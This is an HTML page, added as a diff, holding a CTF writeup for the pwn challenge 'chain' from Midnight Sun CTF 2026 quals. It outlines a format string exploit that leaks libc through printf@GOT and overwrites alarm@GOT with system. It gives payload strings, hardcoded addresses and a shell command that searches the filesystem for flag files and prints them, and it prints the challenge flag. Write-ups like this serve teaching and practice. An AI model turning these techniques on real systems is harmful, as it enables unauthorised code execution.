@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>chain | W4llz Writeups</title>
+  <link rel="stylesheet" href="/public/writeups.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700;900&family=Space+Grotesk:wght@400;700;900&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="scanlines"></div>
+  <div class="glow-orb one"></div>
+  <div class="glow-orb two"></div>
+
+  <div class="site-shell">
+    <nav class="site-nav">
+      <div class="nav-inner">
+        <a class="brand" href="/">
+          <div class="brand-mark">W</div>
+          <div class="brand-text">
+            <div class="brand-name">W4llz</div>
+            <div class="brand-subtitle">CTF Writeups</div>
+          </div>
+        </a>
+        <div class="nav-links">
+          <a href="/">Home</a>
+          <a href="/c/midnight-sun-ctf-2026-quals/">Competitions</a>
+          <a href="https://github.com/z68d/z68d.github.io">GitHub</a>
+        </div>
+      </div>
+    </nav>
+
+    <main class="container">
+      
+<div class="topbar"><a href="/c/midnight-sun-ctf-2026-quals/cat/pwn-still-baby/">← Back to category</a></div>
+<section class="hero compact">
+  <div class="hero-grid"></div>
+  <div class="hero-content">
+    <div class="eyebrow"><span class="pulse-dot"></span> writeup</div>
+    <h1>chain</h1>
+    <p>you -&gt; know -&gt; what -&gt; to -&gt; do</p>
+  </div>
+</section>
+
+<div class="writeup-page">
+  <div class="writeup-card">
+    
+<div class="overview-grid">
+  <div><span>Name:</span> chain</div>
+  <div><span>Author:</span> @hfs</div>
+  <div><span>Category:</span> pwn / still_baby</div>
+  <div><span>Flag format:</span> midnight{...}</div>
+  <div><span>Objective:</span> Use the format string vulnerability to leak libc, overwrite control flow, and execute a command that prints the flag.</div>
+</div>
+
+  </div>
+
+  <article class="writeup-card prose">
+    <h1>pwn / still_baby / chain</h1>
+<h2>Challenge Overview</h2>
+<p>Name: chain</p>
+<p>Author: @hfs</p>
+<p>Category: pwn / still_baby</p>
+<p>Description: you -&gt; know -&gt; what -&gt; to -&gt; do</p>
+<p>Flag format: midnight{...}</p>
+<p>Objective: Use the format string vulnerability to leak libc, overwrite control flow, and execute a command that prints the flag.</p>
+<h2>Files Provided</h2>
+<ul>
+<li>chain.tar.gz</li>
+<li>chain/chain-f1301a4f53983c2b9310ce27c11fb1d7</li>
+</ul>
+<h2>Solution Plan</h2>
+<p>1. Use the format string bug to leak stack and heap values.</p>
+<p>2. Redirect format string argument pointers to leak <code>printf@GOT</code> and calculate the libc base.</p>
+<p>3. Overwrite <code>alarm@GOT</code> with <code>system</code>, build a small cdecl call frame, and return into the overwritten PLT entry with a flag-reading command.</p>
+<h2>Code (Exploit Script)</h2>
+<pre><code class="language-bash">python3 solve_chain.py</code></pre>
+<pre><code class="language-python">PRINTF_GOT = 0x0804C004
+ALARM_GOT = 0x0804C010
+ALARM_PLT = 0x08049070
+LOOP_RET = 0x08049361
+PRINTF_OFF = 0x57520
+SYSTEM_OFF = 0x47CD0
+
+sendline(sock, &quot;%6$08x.%16$08x&quot;)
+
+sendline(sock, b&quot;LEAK%12$sDONE&quot;)
+printf_addr = struct.unpack(&quot;&lt;I&quot;, leak)[0]
+libc_base = printf_addr - PRINTF_OFF
+system_addr = libc_base + SYSTEM_OFF
+
+cmd = &quot;id;find / -maxdepth 3 -type f -name &#x27;*flag*&#x27; -exec cat {} \\; 2&gt;/dev/null;#&quot;</code></pre>
+<h2>Flag</h2>
+<pre><code class="language-txt">midnight{4ny_pTr_1s_g00d_f0r_m3}</code></pre>
+<h2>Notes</h2>
+<p>Both flags were submitted successfully during solving.</p>
+  </article>
+</div>
+
+    </main>
+  </div>
+</body>
+</html>
